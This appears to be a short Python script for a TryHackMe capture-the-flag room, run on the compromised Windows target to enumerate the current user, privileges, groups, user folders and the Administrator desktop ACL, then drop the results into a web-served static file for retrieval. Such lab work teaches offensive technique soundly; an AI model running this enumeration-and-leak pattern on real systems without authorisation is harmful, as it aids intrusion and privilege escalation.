#tryhackme room St3alMyH34rt 
# YouTube video walk throgh: https://youtu.be/odYTI5DxFc0
# Code by Claudi AI

import subprocess, os

out = ""

# Who are we really?
r = subprocess.run("whoami", shell=True, capture_output=True, text=True)
out += f"WHOAMI: {r.stdout}\n"

r = subprocess.run("whoami /priv", shell=True, capture_output=True, text=True)
out += f"PRIVS:\n{r.stdout}\n"

r = subprocess.run("whoami /groups", shell=True, capture_output=True, text=True)
out += f"GROUPS:\n{r.stdout}\n"

# Check what's actually in Users directory
r = subprocess.run("dir C:\\Users", shell=True, capture_output=True, text=True)
out += f"USERS DIR:\n{r.stdout}\n"

# Check ACL on the desktop
r = subprocess.run(
    r'icacls "C:\Users\Administrator\Desktop"',
    shell=True, capture_output=True, text=True
)
out += f"DESKTOP ACL:\n{r.stdout}{r.stderr}\n"

with open(r"C:\valentine\static\result.txt", "w") as f:
    f.write(out)
